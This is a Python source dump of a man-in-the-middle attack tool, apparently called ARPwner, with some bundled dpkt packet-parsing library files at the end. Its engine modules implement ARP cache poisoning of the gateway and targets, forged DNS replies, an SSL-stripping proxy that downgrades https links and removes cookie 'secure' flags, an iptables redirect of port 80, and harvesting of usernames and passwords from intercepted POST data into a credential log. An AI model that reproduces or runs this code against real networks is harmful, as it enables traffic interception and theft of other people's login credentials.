__FILENAME__ = analyzepost
import urllib

class parameterObj(object):
    """
        object of analyze class
    """
    def __init__(self, type, request):
		self.type = type
		self.request = request

class analyzePost:
    """
        this class analyze the post data and check if in it there is any username or password
    """
    def __init__(self):
        self.User = 1
        self.Passwd = 2
        self.parameters = self.loadFile()
        
    def analyze(self,infologger,data,hostname):
        # debug print data   
        user, passwd = '',''  
        data = urllib.unquote_plus(data)
        data = data.split('&')
        for pdata in data:
            for parameter in self.parameters:
                if (pdata[:len(parameter.request)].lower() == parameter.request.lower() and len(pdata[:len(parameter.request)])>=1):
                    if parameter.type == self.User:
                        user = pdata[len(parameter.request):]
                    elif parameter.type == self.Passwd:
                        passwd = pdata[len(parameter.request):]
        if(len(user)>1 and len(passwd)>1):
            infologger.addInfo('HTTP', hostname, user, passwd)

    def loadFile(self):
        type = None
        data = []
        f = open('./Resources/request.lst','r')
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            if line == '[user]':
                type = self.User
            elif line == '[pass]':
                type = self.Passwd
            else:
                if type == self.User:
                    data += [parameterObj(self.User,line)]
                elif type == self.Passwd:
                    data += [parameterObj(self.Passwd,line)]
        return data

########NEW FILE########
__FILENAME__ = arp
import socket
import binascii
import time
import sys
import os
import struct
import threading
import random
from Engine.functions import incIp, macFormat, ipFormat

try:
    import Libs.dpkt as dpkt
except ImportError:
    sys.exit("[-] Couldn't import: ./Libs/dpkt")
try:
    import fcntl
except ImportError:
    sys.exit("[-] Couldn't import: fcntl")

class Sock:

    def open_sock(self, iface, timeout = None):
        sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
        sock.bind((iface, dpkt.ethernet.ETH_TYPE_ARP))
        if (timeout != None): sock.settimeout(timeout)
        return sock



class targetObject(object):
    def __init__(self,ip, mac = None, brand = None):
        self.ip = ip
        self.mac = mac
        self.brand = brand

class ARP(threading.Thread):
    def __init__(self,iface):
        threading.Thread.__init__(self)
        self.iface = iface
        self.network = [] #Network list (list where saves the networks client)
        self.targets = [] #target list (list where saves the networks clients to spoof it)
        self.running = False
        self.ping = False # this enable or disable the ping in the isOnline
        self.ffMac = '\xff\xff\xff\xff\xff\xff'
        self.enableForwarding()
        try:
            self.srcMac = self.iface.hwaddr
            self.srcIp = self.iface.ip
            self.gateway = targetObject(self.iface.gateway,self.iface.gwhwaddr)
            self.retdata = True
        except(IOError, OSError):
            self.retdata = False

    def enableForwarding(self):
        if sys.platform == 'darwin':
            os.system('sysctl -w net.inet.ip.forwarding=1')
            os.system('sysctl -w net.inet.ip.fw.enable=1')
        elif sys.platform[:5] == 'linux':
            f = open('/proc/sys/net/ipv4/ip_forward','w')
            f.write('1')
            f.close()

    def isOnline(self,dst=None): #checks if the ip is online or not, using ARP WHO
        arp = dpkt.arp.ARP()
        arp.sha = self.srcMac  #mac of host machine
        arp.spa = socket.inet_aton(self.srcIp)  #ip of host machine
        arp.tha = self.ffMac    #fake Mac Address
        arp.tpa = socket.inet_aton(dst) #ip of target machine to check.
          
        packet = dpkt.ethernet.Ethernet()
        packet.src  = self.srcMac
        packet.dst  = self.ffMac
        packet.data = arp
        packet.type = dpkt.ethernet.ETH_TYPE_ARP
        try:
            sock = Sock().open_sock(self.iface.name, 0.1)
            sock.send(str(packet))
            buf = sock.recv(0xffff)
        except socket.timeout:
            sock.close()
            if (self.ping):
                tmp = self.pingIp(dst)
                if (tmp == False):
                    return False
                else:
                    return tmp
            else:
                return False
        sock.close()
        return targetObject(dst,buf[6:12])

    def pingIp(self, dst=None):
        icmp = str(dpkt.icmp.ICMP(type=8, data=dpkt.icmp.ICMP.Echo(id=random.randint(0, 0xffff), data='ARPwner')))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
            sock.connect((dst,1))
            sock.send(icmp)
            sock.settimeout(0.5)
            buf = sock.recv(0xffff)
        except(socket.timeout,socket.error):
            sock.close()
            return False
        ##debug print "Found PC: %s"%(dst)
        return targetObject(dst)

    def buildPoison(self, src=None, dst=None):
        arp = dpkt.arp.ARP()
        arp.sha = self.srcMac
        arp.spa = socket.inet_aton(dst.ip)
        arp.tha = src.mac
        arp.tpa = socket.inet_aton(src.ip)
        arp.op  = dpkt.arp.ARP_OP_REPLY
      
        packet = dpkt.ethernet.Ethernet()
        packet.src  = self.srcMac
        packet.dst  = src.mac
        packet.data = arp
        packet.type = dpkt.ethernet.ETH_TYPE_ARP
        return packet

    def arpPoison(self, src=None, dst=None):
        if (src != None and dst != None):
            sock = Sock().open_sock(self.iface.name)
            sock.send(str(self.buildPoison(src, dst)))
            sock.send(str(self.buildPoison(dst, src)))
            sock.close()

    def scanRange(self,ip1,ip2):
        while(ip1 != ip2):
            request = self.isOnline(ip1)
            if(request != False): self.network += [request]
            ip1 = incIp(ip1)
        return len(self.network)

    def addTarget(self,target):
        try:
            self.targets.append(self.network[target])
            self.network.pop(target)
        except(IndexError):
            pass

    def addipTarget(self,ip):
        try:
            for i in range(0,len(self.network)):
                if self.network[i].ip == ip:
                    self.targets.append(self.network[i])
                    self.network.pop(i)
        except(IndexError):
            pass


    def remipTarget(self,ip):
        try:
            for i in range(0,len(self.targets)):
                if self.targets[i].ip == ip:
                    self.network.append(self.targets[i])
                    self.targets.pop(i)
        except(IndexError):
            pass

    def remTarget(self,target):
        self.targets.pop(target)

    def run(self):
        while(self.running):
            for target in self.targets:
                #print "Poisoning %s  --- > %s"%(self.gateway.ip,target.ip)
                self.arpPoison(self.gateway,target)
                time.sleep(1)

        



#for target in targets:
#    print target['IP']
#while(1):
#    arp.arpPoison('10.0.0.1','10.0.0.204')

########NEW FILE########
__FILENAME__ = dnsSpoof
import Libs.dpkt as dpkt
import socket

class objDomain(object):
    def __init__(self, dns, ip):
        self.dns = dns
        self.ip = ip

class dnsSpoof:
    def __init__(self):
        self.domains = []
        self.running = False

    def addDomain(self, dns, ip):
        self.domains += [objDomain(dns,ip)]

    def remDomain(self, dns):
        try:
            for i in range(0,len(self.domains)):
                if self.domains[i].dns == dns:
                    self.domains.pop(i)
        except(IndexError):
            pass

    def analyze(self,packet):
        dns = dpkt.dns.DNS(packet.data.data)
        for domain in self.domains:
            if domain.dns == dns.qd[0].name:
                if dns.qr != dpkt.dns.DNS_Q:
                    return
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    return
                if len(dns.qd) != 1:
                    return
                if len(dns.an) != 0:
                    return
                if len(dns.ns) != 0:
                    return
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    return
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    return

                dns.op = dpkt.dns.DNS_RA
                dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                dns.qr = dpkt.dns.DNS_R

                arr = dpkt.dns.DNS.RR()
                arr.cls = dpkt.dns.DNS_IN
                arr.type = dpkt.dns.DNS_A
                arr.name = dns.qd[0].name
                arr.ip = socket.inet_aton(domain.ip)

                dns.an.append(arr)
                port = packet.data.sport

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(str(dns), (socket.inet_ntoa(packet.src), port))


########NEW FILE########
__FILENAME__ = functions
import struct
import socket
import binascii

def _inc_ipfield(addr, i):

    addr[i] = (addr[i] + 1) % 256
    if addr[i] == 0:
        if i > 0:
            addr = _inc_ipfield(addr, i-1)
        else:
            raise 'IP Overflow'
    return addr

def incIp(str_addr):
    addr = map(int,str_addr.split('.'))
    return '.'.join(map(str,_inc_ipfield(addr, len(addr)-1)))

def macFormat(addr):
    try:
        hwaddr = "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB",addr)
    except(struct.error):
        hwaddr = addr  
    return hwaddr

def mactohex(addr):
    try:
        if len(addr) == 17:
            addr =  ''.join(map(str,addr.split(':')[1:]))
            return binascii.unhexlify(addr)
        else:
            return binascii.unhexlify(addr)
    except:
        return None

def ipFormat(addr):
    try:
        addr = socket.inet_ntoa(addr)
    except(socket.error):
        addr = addr
    return addr

def ipfromHex(ip):
    try:
        ip = struct.pack("<L", int(ip,16))
        return socket.inet_ntoa(ip)
    except:
        return None


########NEW FILE########
__FILENAME__ = httpstrip
import SocketServer
import os
import BaseHTTPServer
import threading

import StringIO
import string
import gzip
import sys
import re

import urllib
import httplib
import base64
import urlparse
from Engine import analyzepost

HEADERTAG_HOST = 'host'
HEADERTAG_PROXYCONNECTION = 'proxy-connection'
HEADERTAG_ENCODING = 'content-encoding'
HEADERTAG_CONTENTLENGTH = 'content-length'
HEADERTAG_CONTENTTYPE = 'content-type'
HEADERTAG_LOCATION = 'location'
HEADERTAG_SETCOOKIE = 'set-cookie'
HEADERTAG_REFERER = 'referer'
HEADERTAG_CACHECONTROL = 'cache-control'
HEADERTAG_LASTMODIFIED = 'last-modified'
HEADERTAG_CONNECTION = 'connection'
HEADERTAG_KEEPALIVE = 'keep-alive'

SCHEME_HTTP = 'http'
SCHEME_HTTPS = 'https'

METHOD_POST = 'POST'
METHOD_GET = 'GET'

infologger = None



def fix_dict(d):
    nd = {}
    for key, item in d.items():
        nd[key.lower()] = item
    return nd

class CookieParser:
    """
        Unfortunately, httplib returns the cookies header oddly formatted, so they
        must be parsed in order to send them correctly to the client.
        Additionally, the 'secure' flag must be stripped in order for the session to work
        properly over the client-proxy insecure link
    """
    regex_date_pattern = re.compile('([a-zA-Z]{3}, [0-9]{2}(?: |-)[a-zA-Z]{3}(?: |-)[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2})')
    def __init__(self, cookie_string):
        self.set_cookie_string(cookie_string)

    @staticmethod
    def __dates_hide_comma__(cookie_string):
        cookies = cookie_string.split(';')
        #debug print cookie_string
        result = []
        for cookie in cookies:
            if 'expires=' in cookie.lower():
                match_list = CookieParser.regex_date_pattern.findall(cookie)
                #debug print match_list
                replaced = string.replace(match_list[0], ',', '${COMMA}')
                cookie = string.replace(cookie, match_list[0], replaced)

            result.append(cookie)
        #debug print ';'.join(result)
        return ';'.join(result)
    
    @staticmethod
    def __dates_unhide_comma__(cookie_string):
        return string.replace(cookie_string, '${COMMA}', ',')

    @staticmethod
    def __strip_secure_flag__(cookie):
        fields = cookie.split(';')

        for field in fields:
            if field.lower().strip() == 'secure':
                fields.remove(field)

        return ';'.join(fields)

    def set_cookie_string(self, cookie_string):
        cookie_string = CookieParser.__dates_hide_comma__(cookie_string)
        self.cookies = tuple(map(CookieParser.__dates_unhide_comma__, cookie_string.split(',')))
    
    def strip_secure_flag(self):
        self.cookies = tuple(map(CookieParser.__strip_secure_flag__, self.cookies))

    def get_cookies(self):
        return tuple(self.cookies)
    

                
    
class SSLStripper:

    regex_url_pattern = re.compile('((https((:[/\\\\]{0,8})|(%3A%2F%2F|%253A%252F%252F)))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)', re.IGNORECASE)
    regex_url_ignore_quoted_pattern = re.compile('((https(:[/\\\\]{0,8}))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)', re.IGNORECASE)
    find_index = 0    
    regex_http_pattern = re.compile('(https?:[/\\\\]{0,8})')

    url_db = set([])
    def stripstring(self, str_, ignore_quoted=False):
        if not ignore_quoted:
            occurrences = self.regex_url_pattern.findall(str_)
        else:
            occurrences = self.regex_url_ignore_quoted_pattern.findall(str_)

        replace_tag = 'http://'
        #print self.url_db
        for item in occurrences:
            url = item[self.find_index]
            
            if not ignore_quoted:
                mod_url = string.replace(urllib.unquote_plus(url), '\\', '')
            else:
                mod_url = string.replace(url, '\\', '')

            mod_url = self.regex_http_pattern.sub(replace_tag, mod_url)

            #debug print 'url', url, 'mod_url', mod_url

            parsed_url = urlparse.urlparse(mod_url.lower())
            target_path = parsed_url.path
            if len(target_path) < 1: target_path = '/'
            self.url_db.add(parsed_url.scheme + '://' + parsed_url.netloc + target_path)
            str_ = string.replace(str_, url, 'http' + url[5:])
        return str_

    def in_list(self, url):
        parsed_url = urlparse.urlparse(url)
        target_path = parsed_url.path
        if len(target_path) < 1: target_path = '/'
        return ((parsed_url.scheme + '://' + parsed_url.netloc + target_path).lower()  in self.url_db)
        
globalstripper = SSLStripper()
analyzeData = analyzepost.analyzePost()

class SSLProxyHTTPHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    strip_server_headers_list = (HEADERTAG_LASTMODIFIED, HEADERTAG_CACHECONTROL, HEADERTAG_ENCODING, HEADERTAG_CONTENTLENGTH, HEADERTAG_CONNECTION, HEADERTAG_KEEPALIVE)
    strip_client_headers_list = (HEADERTAG_REFERER, HEADERTAG_PROXYCONNECTION, HEADERTAG_CACHECONTROL, HEADERTAG_HOST, HEADERTAG_CONNECTION, HEADERTAG_KEEPALIVE)

    http_connection = None

    def do_POST(self):
        return self.handle_connection(METHOD_POST,self.rfile.read(int(self.headers[HEADERTAG_CONTENTLENGTH])))

    def do_GET(self):
        return self.handle_connection(METHOD_GET, None)
    
    def log_message(self,*args):
	    pass

    @staticmethod
    def __strip_headers__(header_dict, header_list):
        """ Strip headers from dict using class parameters
            @header_dict: Dictionary to delete headers from
            @header_list: List of headers to delete
        """
        for header in header_list:
            if header in header_dict:
                del header_dict[header]
        return header_dict

    @staticmethod
    def __stripssl_headers__(header_dict, stripper):
        for header in header_dict:
            if header.lower() != HEADERTAG_SETCOOKIE:
                header_dict[header] = map(lambda x: stripper.stripstring(x), header_dict[header])
        return header_dict
            

    def __start_server_connection__(self, ssl, host, port):
        """ Start connection to remote server.
            @ssl: Whether connection must be done over an ssl socket
        """

        if self.http_connection is None:
            # Create connection 
            if port is not None and port > 0:
                if ssl:
                    self.http_connection = httplib.HTTPSConnection(host, port)
                else:
                    self.http_connection = httplib.HTTPConnection(host, port)
            else:
                # Use default port
                if ssl:
                    self.http_connection = httplib.HTTPSConnection(host)
                else:
                    self.http_connection = httplib.HTTPConnection(host)

            self.http_connection.connect()

    def __create_client_header_dict__(self):
        """
            Create dictionary of headers sent by the client.
        """
        header_dict = {}
        for key, item in self.headers.dict.items():
            # New dictionary contains keys in lower case and items are actually lists (Headers may appear multiple times)
            header_dict[key.lower()] = self.headers.getheaders(key)
        return header_dict

    def __create_server_header_dict__(self, response):
        header_dict = {}
        for key, item in response.getheaders():
            header_dict[key] = header_dict.get(key, [])
            header_dict[key].append(item)

        # Fix cookie parsing
        if HEADERTAG_SETCOOKIE in header_dict:
            cookie_parser = CookieParser(','.join(header_dict[HEADERTAG_SETCOOKIE]))
            cookie_parser.strip_secure_flag()
            header_dict[HEADERTAG_SETCOOKIE] = cookie_parser.get_cookies()
                
        return header_dict

    def __send_headers_to_server__(self, header_dict):
        """ Send a correctly formatted dictionary of headers to server
            @header_dict: Dictionary to send
        """
        for key, item in header_dict.items():
            for subitem in item:
                self.http_connection.putheader(key, subitem)

    def __send_headers_to_client__(self, header_dict):
        """ Send a correctly formatted dictionary of headers to client
            @header_dict: Dictionary to send
        """
        for key, item in header_dict.items():
            for subitem in item:
                self.send_header(key, subitem)
    
    def handle_connection(self, method, post_data):
        client_headers = self.__create_client_header_dict__()

        # Parse hostname
        host_data = client_headers[HEADERTAG_HOST][0].split(':')
        hostname = host_data[0]
        if len(host_data) > 1:
            port = host_data[1]
        else:
            port = None
        
        if self.path[:4].lower().strip() == 'http':
            target_path = '/' + '/'.join(self.path.split('/')[3:])
        else:
            target_path = self.path

        target_url = 'http://' + hostname + target_path

        self.__start_server_connection__(globalstripper.in_list(target_url), hostname, port)
        
        self.http_connection.putrequest(method, target_path)
        
        #debug print 'client headers', client_headers
        self.__send_headers_to_server__(SSLProxyHTTPHandler.__strip_headers__(client_headers, self.strip_client_headers_list))
        self.http_connection.putheader(HEADERTAG_CONNECTION, 'close')
        self.http_connection.endheaders()

        if post_data is not None:
            self.http_connection.send(post_data)
        
        response = self.http_connection.getresponse()

        self.send_response(response.status)

        server_headers = self.__create_server_header_dict__(response)
        #server_headers = SSLProxyHTTPHandler.__stripssl_headers__(server_headers, globalstripper)
        
        if HEADERTAG_LOCATION in server_headers:
            server_headers[HEADERTAG_LOCATION] = map(lambda x: globalstripper.stripstring(x, True), server_headers[HEADERTAG_LOCATION])

        # SSL Strip
        
        contents = response.read()
        

        # gunzip
        if HEADERTAG_ENCODING in server_headers and ('gzip' in ','.join(server_headers[HEADERTAG_ENCODING])):
            contents = gzip.GzipFile(fileobj=StringIO.StringIO(contents)).read()
        
        # URL Tampering
        
        if HEADERTAG_CONTENTTYPE in server_headers:
            if ('image' not in ','.join(server_headers[HEADERTAG_CONTENTTYPE])) and ('movie' not in ','.join(server_headers[HEADERTAG_CONTENTTYPE])):
                contents = globalstripper.stripstring(contents)

        
        
        #debug print 'server headers', server_headers
        self.__send_headers_to_client__(SSLProxyHTTPHandler.__strip_headers__(server_headers, self.strip_server_headers_list))
        self.end_headers()
        self.wfile.write(contents)
        if post_data is not None and len(post_data)>1:
            analyzeData.analyze(infologger, post_data, hostname)

            
class ThreadedHTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer, BaseHTTPServer.HTTPServer):

    def handle_error(self,*args):
        pass

class run_server(threading.Thread):
    def __init__(self,logger,port=1337):
        threading.Thread.__init__(self)
        global infologger
        infologger = logger
        self.port = port
        self.running = False

    def enableForwarding(self):
        if sys.platform == 'darwin':
            pass
        elif sys.platform[:5] == 'linux':
            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1337')

    def disableForwarding(self):
        if sys.platform == 'darwin':
            pass
        elif sys.platform[:5] == 'linux':
            os.system('iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1337')

    def run(self):
        self.running = True
        self.enableForwarding()
        server_class=ThreadedHTTPServer
        handler_class=SSLProxyHTTPHandler
        server_address = ('', self.port)
        self.httpd = server_class(server_address, handler_class)
        while (self.running):
            self.httpd.handle_request()

    def stop(self):
        self.running = False
        self.disableForwarding()
        self._Thread__stop()



########NEW FILE########
__FILENAME__ = ifaces
from Engine.functions import ipfromHex, mactohex
import socket
import fcntl
import struct
import binascii

class ifacesObject(object):
   def __init__(self,name, ip, hwaddr, gateway, gwhwaddr):
        self.name = name
        self.ip = ip
        self.hwaddr = hwaddr
        self.gateway = gateway
        self.gwhwaddr = gwhwaddr

class getIfaces:
    def __init__(self):
        self.interfaces = self.getIfaces()

    def getMac(self,ifname):
        '''get mac address of iface, only works on unix'''
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
        return ''.join(['%02x' % ord(char) for char in info[18:24]])

    def getIp(self, ifname):  #get ip address of iface, only works on unix
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24])

    def getarpData(self,iface, ip):
        data = file('/proc/net/arp').read().splitlines()[1:]
        for line in data:
            line = line.rsplit(' ')
            entry = filter(lambda x:len(x) >=1 and x ,line)
            if entry[5] == iface and entry[0] == ip:
                return entry[3]
        return None

    def getIfaces(self):
        '''get ifaces from /proc/net route and return an object array
           with the ip hwaddr of the iface and gateway'''
        route = []
        data = file('/proc/net/route').read().splitlines()[1:] 
        for line in data:
            line = line.replace('\t',' ').strip().rsplit(' ')
            if line[2] != '00000000':
                route +=[ifacesObject(line[0], self.getIp(line[0]), binascii.unhexlify(self.getMac(line[0])),
                         ipfromHex(line[2]),mactohex(self.getarpData(line[0],ipfromHex(line[2]))))]
        return route


########NEW FILE########
__FILENAME__ = infologger
class infoObject(object):
    def __init__(self,service, host, user, passwd):
        self.service = service
        self.host = host
        self.user = user
        self.passwd = passwd
        

class logger():
    def __init__(self):
        self.information = []
        
    def addInfo(self,service,host,user,passwd):
        for obj in self.information:
            if (obj.service == service and obj.host == host and obj.user == user and obj.passwd == passwd):return
        self.information += [infoObject(service, host, user, passwd)]


#self.information += information += [{'Service':'FTP', 'Host':traffic.src,'User': user, 'Passwd': passwd}]

########NEW FILE########
__FILENAME__ = plugins
import dircache
import sys

class Plugins:
    def __init__(self):
        self.plugins = []
        self.loadPlugins()

    def loadPlugins(self):
        filelist = dircache.listdir('./Protocols/')
        for filename in filelist:
            if not '.' in filename:
                sys.path.insert(0,'./Protocols/'+ filename)
                tmp = __import__(filename)
                self.plugins += [tmp]
                #debug print '<Loaded Module %s>'%(filename)
                sys.path.remove('./Protocols/'+ filename)

    def enablePlugin(self,name):
        for plugin in self.plugins:
            if plugin.PROPERTY['NAME']==name:
                plugin.PROPERTY['ENABLED']=True

    def disablePlugin(self,name):
        for plugin in self.plugins:
            if plugin.PROPERTY['NAME']==name:
                plugin.PROPERTY['ENABLED']=False

########NEW FILE########
__FILENAME__ = sniff
import sys
import threading

try:
    import Libs.dpkt as dpkt
except ImportError:
    sys.exit("[-] Couldn't import: ./Libs/dpkt")
try:
    import pcap
except ImportError:
    sys.exit("[-] Couldn't import: pypcap http://code.google.com/p/pypcap/")

class sniff(threading.Thread):
    def __init__(self, iface, logger, plugins, dns = None):
        threading.Thread.__init__(self)
        self.running = False
        self.protocols = plugins.plugins
        self.iface = iface
        self.logger = logger
        self.dnsSpoof = dns
        self.pc = pcap.pcap(self.iface.name)

    def run(self):
        for ts, pkt in self.pc:
            if(self.running == False): break
            try:
                packet = dpkt.ethernet.Ethernet(pkt)

                if packet.type == dpkt.ethernet.ETH_TYPE_IP:
                    packet = packet.data
                    if self.dnsSpoof != None and self.dnsSpoof.running == True:
                        if packet.p == 17:
                            udp = packet.data
                            if udp.dport == 53:
                                self.dnsSpoof.analyze(packet)

                    #plugin check and call
                    try:
                        for protocol in self.protocols:
                            if protocol.PROPERTY['ENABLED'] == True:
                                try:
                                    if (packet.data.dport == protocol.PROPERTY['DPORT'] or packet.data.sport==protocol.PROPERTY['SPORT']):
                                        protocol.plugin(packet,self.logger).analyze()
                                except(KeyError):
                                    pass
                    except(AttributeError):
                        pass
            except:
                pass


########NEW FILE########
__FILENAME__ = ah
# $Id: ah.py 34 2007-01-28 07:54:20Z dugsong $

"""Authentication Header."""

import dpkt

class AH(dpkt.Packet):
    __hdr__ = (
        ('nxt', 'B', 0),
        ('len', 'B', 0),	# payload length
        ('rsvd', 'H', 0),
        ('spi', 'I', 0),
        ('seq', 'I', 0)
        )
    auth = ''
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.auth = self.data[:self.len]
        buf = self.data[self.len:]
        import ip
        try:
            self.data = ip.IP.get_proto(self.nxt)(buf)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            self.data = buf

    def __len__(self):
        return self.__hdr_len__ + len(self.auth) + len(self.data)

    def __str__(self):
        return self.pack_hdr() + str(self.auth) + str(self.data)

########NEW FILE########
__FILENAME__ = aim
# $Id: aim.py 23 2006-11-08 15:45:33Z dugsong $

"""AOL Instant Messenger."""

import dpkt
import struct

# OSCAR: http://iserverd1.khstu.ru/oscar/

class FLAP(dpkt.Packet):
    __hdr__ = (
        ('ast', 'B', 0x2a),	# '*'
        ('type', 'B', 0),
        ('seq', 'H', 0),
        ('len', 'H', 0)
    )
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.ast != 0x2a:
            raise dpkt.UnpackError('invalid FLAP header')
        if len(self.data) < self.len:
            raise dpkt.NeedData, '%d left, %d needed' % (len(self.data), self.len)

class SNAC(dpkt.Packet):
    __hdr__ = (
        ('family', 'H', 0),
        ('subtype', 'H', 0),
        ('flags', 'H', 0),
        ('reqid', 'I', 0)
        )

def tlv(buf):
    n = 4
    try:
        t, l = struct.unpack('>HH', buf[:n])
    except struct.error:
        raise dpkt.UnpackError
    v = buf[n:n+l]
    if len(v) < l:
        raise dpkt.NeedData
    buf = buf[n+l:]
    return (t,l,v, buf)

# TOC 1.0: http://jamwt.com/Py-TOC/PROTOCOL

# TOC 2.0: http://www.firestuff.org/projects/firetalk/doc/toc2.txt


########NEW FILE########
__FILENAME__ = arp
# $Id: arp.py 23 2006-11-08 15:45:33Z dugsong $

"""Address Resolution Protocol."""

import dpkt

# Hardware address format
ARP_HRD_ETH	= 0x0001	# ethernet hardware
ARP_HRD_IEEE802	= 0x0006	# IEEE 802 hardware

# Protocol address format
ARP_PRO_IP	= 0x0800	# IP protocol

# ARP operation
ARP_OP_REQUEST		= 1	# request to resolve ha given pa
ARP_OP_REPLY		= 2	# response giving hardware address
ARP_OP_REVREQUEST	= 3	# request to resolve pa given ha
ARP_OP_REVREPLY		= 4	# response giving protocol address

class ARP(dpkt.Packet):
    __hdr__ = (
        ('hrd', 'H', ARP_HRD_ETH),
        ('pro', 'H', ARP_PRO_IP),
        ('hln', 'B', 6),	# hardware address length
        ('pln', 'B', 4),	# protocol address length
        ('op', 'H', ARP_OP_REQUEST),
        ('sha', '6s', ''),
        ('spa', '4s', ''),
        ('tha', '6s', ''),
        ('tpa', '4s', '')
        )

########NEW FILE########
__FILENAME__ = asn1
# $Id: asn1.py 23 2006-11-08 15:45:33Z dugsong $

"""Abstract Syntax Notation #1."""

import struct, time
import dpkt

# Type class
CLASSMASK    = 0xc0
UNIVERSAL    = 0x00
APPLICATION  = 0x40
CONTEXT      = 0x80
PRIVATE      = 0xc0

# Constructed (vs. primitive)
CONSTRUCTED  = 0x20

# Universal-class tags
TAGMASK      = 0x1f
INTEGER      = 2
BIT_STRING   = 3	# arbitrary bit string
OCTET_STRING = 4	# arbitrary octet string
NULL         = 5
OID          = 6	# object identifier
SEQUENCE     = 16	# ordered collection of types
SET          = 17	# unordered collection of types
PRINT_STRING = 19	# printable string
T61_STRING   = 20	# T.61 (8-bit) character string
IA5_STRING   = 22	# ASCII
UTC_TIME     = 23

def utctime(buf):
    """Convert ASN.1 UTCTime string to UTC float."""
    yy = int(buf[:2])
    mm = int(buf[2:4])
    dd = int(buf[4:6])
    hh = int(buf[6:8])
    mm = int(buf[8:10])
    try:
        ss = int(buf[10:12])
        buf = buf[12:]
    except TypeError:
        ss = 0
        buf = buf[10:]
    if buf[0] == '+':
        hh -= int(buf[1:3])
        mm -= int(buf[3:5])
    elif buf[0] == '-':
        hh += int(buf[1:3])
        mm += int(buf[3:5])
    return time.mktime((2000 + yy, mm, dd, hh, mm, ss, 0, 0, 0))

def decode(buf):
    """Sleazy ASN.1 decoder.
    Return list of (id, value) tuples from ASN.1 BER/DER encoded buffer.
    """
    msg = []
    while buf:
        t = ord(buf[0])
        constructed = t & CONSTRUCTED
        tag = t & TAGMASK
        l = ord(buf[1])
        c = 0
        if constructed and l == 128:
            # XXX - constructed, indefinite length
            msg.append(t, decode(buf[2:]))
        elif l >= 128:
            c = l & 127
            if c == 1:
                l = ord(buf[2])
            elif c == 2:
                l = struct.unpack('>H', buf[2:4])[0]
            elif c == 3:
                l = struct.unpack('>I', buf[1:5])[0] & 0xfff
                c = 2
            elif c == 4:
                l = struct.unpack('>I', buf[2:6])[0]
            else:
                # XXX - can be up to 127 bytes, but...
                raise dpkt.UnpackError('excessive long-form ASN.1 length %d' % l)

        # Skip type, length
        buf = buf[2+c:]

        # Parse content
        if constructed:
            msg.append((t, decode(buf)))
        elif tag == INTEGER:
            if l == 0:
                n = 0
            elif l == 1:
                n = ord(buf[0])
            elif l == 2:
                n = struct.unpack('>H', buf[:2])[0]
            elif l == 3:
                n = struct.unpack('>I', buf[:4])[0] >> 8
            elif l == 4:
                n = struct.unpack('>I', buf[:4])[0]
            else:
                raise dpkt.UnpackError('excessive integer length > %d bytes' % l)
            msg.append((t, n))
        elif tag == UTC_TIME:
            msg.append((t, utctime(buf[:l])))
        else:
            msg.append((t, buf[:l]))
        
        # Skip content
        buf = buf[l:]
    return msg

if __name__ == '__main__':
    import unittest
    
    class ASN1TestCase(unittest.TestCase):
        def test_asn1(self):
            s = '0\x82\x02Q\x02\x01\x0bc\x82\x02J\x04xcn=Douglas J Song 1, ou=Information Technology Division, ou=Faculty and Staff, ou=People, o=University of Michigan, c=US\n\x01\x00\n\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectclass0\x82\x01\xb0\x04\rmemberOfGroup\x04\x03acl\x04\x02cn\x04\x05title\x04\rpostalAddress\x04\x0ftelephoneNumber\x04\x04mail\x04\x06member\x04\thomePhone\x04\x11homePostalAddress\x04\x0bobjectClass\x04\x0bdescription\x04\x18facsimileTelephoneNumber\x04\x05pager\x04\x03uid\x04\x0cuserPassword\x04\x08joinable\x04\x10associatedDomain\x04\x05owner\x04\x0erfc822ErrorsTo\x04\x08ErrorsTo\x04\x10rfc822RequestsTo\x04\nRequestsTo\x04\tmoderator\x04\nlabeledURL\x04\nonVacation\x04\x0fvacationMessage\x04\x05drink\x04\x0elastModifiedBy\x04\x10lastModifiedTime\x04\rmodifiersname\x04\x0fmodifytimestamp\x04\x0ccreatorsname\x04\x0fcreatetimestamp'
